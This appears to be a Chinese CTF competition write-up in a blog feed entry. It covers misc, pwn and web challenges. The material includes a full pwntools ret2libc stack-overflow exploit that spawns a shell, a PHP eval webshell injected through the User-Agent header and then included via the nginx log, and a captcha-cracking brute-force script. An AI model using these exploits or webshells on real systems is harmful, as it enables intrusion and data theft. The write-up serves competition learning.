    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Not-Only-Wireshark（solved）"><a href="#Not-Only-Wireshark（solved）" class="headerlink" title="Not Only Wireshark（solved）"></a>Not Only Wireshark（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/NotOnlyWireshark_ed63b63425ec3ed09470d8715b208293.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/NotOnlyWireshark_ed63b63425ec3ed09470d8715b208293.zip?pass=null</a><br><strong>hint: tshark</strong><br>打开流量包，直接查看http数据，发现存在很多name=xxx的访问记录，将所有16进制提取出来。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> strings 123.pcapng| grep name| grep -oP <span class="string">"name=[0-9A-F]+"</span>| tr -d <span class="string">'name='</span>|tr -d <span class="string">'\n'</span> &gt; flag</span></span><br></pre></td></tr></table></figure></p><p>修复zip文件头</p><p>密码是：<code>?id=1128%23</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> strings 123.pcapng| grep key</span></span><br><span class="line">&amp;GET /xss/example4.php?key=?id=1128%23 HTTP/1.1</span><br><span class="line">Referer: http://10.211.55.15/xss/example4.php?key=?id=1128%23</span><br></pre></td></tr></table></figure></p><h3 id="这是道web题？（solved）"><a href="#这是道web题？（solved）" class="headerlink" title="这是道web题？（solved）"></a>这是道web题？（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/yunCMS_256035f22b73fdb1c90fd7503c4005ed.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/yunCMS_256035f22b73fdb1c90fd7503c4005ed.zip?pass=null</a><br>直接用D盾扫一下，发现一个jsp大马和一个变形php一句话</p><p>打开jsp大马看到<code>&lt;Bad way. Get OUT. No000000000flag&gt;</code>，估计不在这里</p><p>然后打开变形php一句话，发现下面有提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You eventually found me</span><br><span class="line">I am a hacker from Georgia</span><br><span class="line">You are doing too much food at your upload</span><br><span class="line">Used tshark to make traffic records?</span><br><span class="line">Then you go to the traffic to find me</span><br></pre></td></tr></table></figure></p><p>打开同目录下的流量包<code>78466550-3fc1-11e8-9828-32001505e920.pcapng</code>，找到访问<code>companytplfiles.php</code>的流量，发现里面有一个jpg和gif，flag就在gif里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print &apos;&apos;.join([chr(x) for x in [102,108,97,103,123,83,48,50,50,121,52,111,114,114,53,125]])</span><br><span class="line">flag&#123;S022y4orr5&#125;</span><br></pre></td></tr></table></figure></p><h3 id="听说你们喜欢手工爆破（solved）"><a href="#听说你们喜欢手工爆破（solved）" class="headerlink" title="听说你们喜欢手工爆破（solved）"></a>听说你们喜欢手工爆破（solved）</h3><p>flag{}内英文字母为大写形式<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/OS_038c9291c8039792d1aad140f6664671.iso?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/OS_038c9291c8039792d1aad140f6664671.iso?pass=null</a><br>根据提示，应该是曼彻斯特码，不过本题的编码不是标准编码，需要脑洞<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">a = <span class="string">'123654AAA678876303555111AAA77611A321'</span></span><br><span class="line"><span class="comment"># 她现在住在F5街区F5街道07号幢</span></span><br><span class="line">f =  <span class="string">'0'</span>+bin(int(<span class="string">'0x'</span>+a,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> f,len(f)</span><br><span class="line"></span><br><span class="line">f2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">142</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> f[i:i+<span class="number">2</span>] == <span class="string">'01'</span>:</span><br><span class="line">f2 += <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">f2 += <span class="string">'1'</span></span><br><span class="line"><span class="keyword">print</span> f2,len(f2)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">71</span>,<span class="number">8</span>):</span><br><span class="line">tmp = f2[i:i+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">flag += hex(int(tmp[:<span class="number">4</span>],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">flag += hex(int(tmp[<span class="number">4</span>:],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> flag.upper()</span><br></pre></td></tr></table></figure></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="game-server（solved）"><a href="#game-server（solved）" class="headerlink" title="game server（solved）"></a>game server（solved）</h3><p>nc 123.59.138.180 20000<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/game_server_ccc0d7c007817105ab5b9d10c6f1c8b1.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/game_server_ccc0d7c007817105ab5b9d10c6f1c8b1.zip?pass=null</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+7h] [ebp-111h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+107h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</span><br><span class="line">  fgets(byte_804A180, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A180, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, byte_804A180);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</span><br><span class="line">  fgets(byte_804A080, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A080, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, byte_804A080);</span><br><span class="line">  nbytes = <span class="built_in">snprintf</span>(</span><br><span class="line">             &amp;s,</span><br><span class="line">             <span class="number">0x100</span>u,</span><br><span class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</span><br><span class="line">             byte_804A180,</span><br><span class="line">             byte_804A080);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, nbytes);         <span class="comment">//此处存在栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, byte_804A180, byte_804A080, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后修改<code>introduce</code>的地方存在明显栈溢出，程序只开了NX，直接利用<code>puts</code>进行泄露函数地址，然后查找对应的libc，计算<code>system</code>偏移getshell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">remote_addr = <span class="string">'123.59.138.180'</span></span><br><span class="line">remote_port = <span class="number">20000</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line">    libc = ELF(<span class="string">'./libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(payload)</span>:</span></span><br><span class="line">    name = <span class="number">255</span>*<span class="string">'A'</span></span><br><span class="line">    p.sendafter(<span class="string">'name?\n'</span>,name)</span><br><span class="line">    noble = <span class="string">'1'</span>*<span class="number">255</span></span><br><span class="line">    p.sendafter(<span class="string">'occupation?\n'</span>,noble)</span><br><span class="line">    p.sendlineafter(<span class="string">'[Y/N]\n'</span>,<span class="string">'Y'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">put = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">junk = <span class="number">277</span>*<span class="string">'A'</span></span><br><span class="line">payload =junk +  p32(put) + p32(<span class="number">0x08048637</span>) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">foo(payload)</span><br><span class="line">p_addr =u32(p.recvuntil(<span class="string">'\xf7'</span>)[<span class="number">-4</span>:])</span><br><span class="line">success(hex(p_addr))</span><br><span class="line">libc.address = p_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line">success(hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">payload2 = junk + p32(libc.symbols[<span class="string">'system'</span>]) + p32(<span class="number">0</span>) + p32(next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">foo(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="Shellcode-Manager"><a href="#Shellcode-Manager" class="headerlink" title="Shellcode Manager"></a>Shellcode Manager</h3><p>nc 123.59.138.180 13579<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/shellcode_manager_0cb5a25a8f7fd4d3b5a12b0bb19d8834.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/shellcode_manager_0cb5a25a8f7fd4d3b5a12b0bb19d8834.zip?pass=null</a></p><h3 id="Starcraft-RPG"><a href="#Starcraft-RPG" class="headerlink" title="Starcraft RPG"></a>Starcraft RPG</h3><p>nc 123.59.138.180 13799<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/starcraft_rpg_507f28c1a20762caf02ffc693f6978eb.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/starcraft_rpg_507f28c1a20762caf02ffc693f6978eb.zip?pass=null</a></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="icm（solved）"><a href="#icm（solved）" class="headerlink" title="icm（solved）"></a>icm（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/icm_49785d49972274eac2273fb2bc3a5704.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/icm_49785d49972274eac2273fb2bc3a5704.zip?pass=null</a></p><h3 id="wcm（solved）"><a href="#wcm（solved）" class="headerlink" title="wcm（solved）"></a>wcm（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/wcm_d46106eb128a18a826d1faab3cf60571.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/wcm_d46106eb128a18a826d1faab3cf60571.zip?pass=null</a></p><h3 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/explain_bbb5702a489a0c0eaac68e6a6fd7329b.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/explain_bbb5702a489a0c0eaac68e6a6fd7329b.zip?pass=null</a></p><h3 id="ccm"><a href="#ccm" class="headerlink" title="ccm"></a>ccm</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/ccm_74cf0e74e3b38a20fefb73d81eb5f0b8.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/ccm_74cf0e74e3b38a20fefb73d81eb5f0b8.zip?pass=null</a></p><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><h3 id="3dlight"><a href="#3dlight" class="headerlink" title="3dlight"></a>3dlight</h3><p>nc 123.59.138.211 20000<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/3dlight_8fe7455b6f72d04629763acf7a793b59.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/3dlight_8fe7455b6f72d04629763acf7a793b59.zip?pass=null</a></p><h3 id="rsa-system"><a href="#rsa-system" class="headerlink" title="rsa system"></a>rsa system</h3><p>nc 123.59.138.211 23333<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/rsa_system_89ab28deea7b30d99a949f2220aac31b.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/rsa_system_89ab28deea7b30d99a949f2220aac31b.zip?pass=null</a></p><h3 id="advanced-ecc"><a href="#advanced-ecc" class="headerlink" title="advanced ecc"></a>advanced ecc</h3><p>nc 123.59.138.211 34545<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/advanced_ecc_a48db2b810bb655bf9e4992894cdbf06.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/advanced_ecc_a48db2b810bb655bf9e4992894cdbf06.zip?pass=null</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="simple-upload（solved）"><a href="#simple-upload（solved）" class="headerlink" title="simple upload（solved）"></a>simple upload（solved）</h3><p>这次在你面前的网站的功能非常简单，接受挑战吧！<br>直接传jsp小马getshell</p><h3 id="shopping-log（solved）"><a href="#shopping-log（solved）" class="headerlink" title="shopping log（solved）"></a>shopping log（solved）</h3><p><a href="http://123.59.141.153/" target="_blank" rel="noopener">http://123.59.141.153/</a><br>或者 <a href="http://120.132.95.234/" target="_blank" rel="noopener">http://120.132.95.234/</a><br>首先需要修改系统<code>hosts</code>文件，然后绕过<code>http header</code>各种限制，最后进入一个订单查询系统，根据提示，直接从<code>9999</code>开始往下爆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> hashlib.md5(x).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcode</span><span class="params">(mdcode)</span>:</span></span><br><span class="line">s3=<span class="string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> s3:</span><br><span class="line">s=i+j+m+n+a</span><br><span class="line"><span class="keyword">if</span> md5(s)[<span class="number">0</span>:<span class="number">6</span>]==mdcode:</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.tmvb.com/5a560e50e61b552d34480017c7877467info.php'</span></span><br><span class="line">url2 = <span class="string">'http://www.tmvb.com/api.php?action=report'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '</span></span><br><span class="line"><span class="string">'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3'</span>,<span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'www.dww.com'</span>,<span class="string">'Accept-Language'</span>: <span class="string">'ja'</span>,<span class="string">'X-Forward-For'</span>:<span class="string">'133.1.16.172'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=48ja11agl6fbo52gsntfk4feq1'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 订单编号：&lt;input type="text" id="TxtTid" placeholder="请输入订单编号后四位" style="margin-right: 30px;" /&gt;</span></span><br><span class="line"><span class="comment"># 验证码：&lt;input type="text" id="code" placeholder="code" style="width:40px;" /&gt;&lt;p&gt;substr(md5(code),0,6) === '167d9f'&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">9999</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">r = requests.get(url=url,headers=headers)</span><br><span class="line"><span class="comment">#print r.content</span></span><br><span class="line">vcode  = re.findall(<span class="string">r"=== '(.&#123;6&#125;)'"</span>,r.content)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> vcode</span><br><span class="line">vv = getcode(vcode)</span><br><span class="line"><span class="comment">#print vv , md5(vv)</span></span><br><span class="line">dat = &#123;<span class="string">'TxtTid'</span>:str(n),<span class="string">'code'</span>:vv&#125;</span><br><span class="line">r = requests.post(url=url2,headers=headers,data=dat)</span><br><span class="line"><span class="keyword">print</span> dat</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'There\'s no such order'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'"error":1'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="comment">#raw_input('go on~')</span></span><br><span class="line">n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="guess-id"><a href="#guess-id" class="headerlink" title="guess id"></a>guess id</h3><p><a href="http://123.59.134.192/" target="_blank" rel="noopener">http://123.59.134.192/</a><br>或 <a href="http://120.132.94.238/" target="_blank" rel="noopener">http://120.132.94.238/</a><br>hint: 身份证号码是有一定规律的<br>hint2: AES256是很棒的加密算法， ECB模式很容易理解</p><h3 id="biubiubiu（solved）"><a href="#biubiubiu（solved）" class="headerlink" title="biubiubiu（solved）"></a>biubiubiu（solved）</h3><p>这次在你面前的网站看起来很复杂，接受挑战吧！<br><a href="http://ff970e071ecc41dcb5f51c0ff0b8ac273cce9a8ac0d44936.game.ichunqiu.com/index.php?page=login.php" target="_blank" rel="noopener">http://ff970e071ecc41dcb5f51c0ff0b8ac273cce9a8ac0d44936.game.ichunqiu.com/index.php?page=login.php</a><br>存在文件包含漏洞</p><p>关键代码send.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'url'</span>]) &#123;</span><br><span class="line">    $url = @$_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^http(s?):\/\/.+/"</span>, $url))&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    curl_setopt($ch,CURLOPT_REDIR_PROTOCOLS,CURLPROTO_GOPHER|CURLPROTO_HTTP|CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>数据库信息conn.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db_host = <span class="string">'mysql'</span>;</span><br><span class="line">$db_name = <span class="string">'user_admin'</span>;</span><br><span class="line">$db_user = <span class="string">'Dog'</span>;</span><br><span class="line">$db_pwd = <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>user.sql<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`admin`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`admin`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">43</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">2</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure></p><p>思路：将一句话写在<code>User-Agent</code>，然后包含nginx的access.log。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://b4249514f2884c21859174e65ddd2615d8f7f25d5a9947b1.game.ichunqiu.com/index.php --header "User-Agent:&lt;?php eval(\$_POST['1'])?&gt;"</span><br></pre></td></tr></table></figure></p><p>然后用菜刀连接<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b4249514f2884c21859174e65ddd2615d8f7f25d5a9947b1.game.ichunqiu.com/index.php?page=../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure></p><p>flag在数据中，用菜刀自带的数据库功能读取即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&quot;Not-Only-Wireshark（solved）&quot;&gt;&lt;a href=&quot;#Not-Only-Wireshark（
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
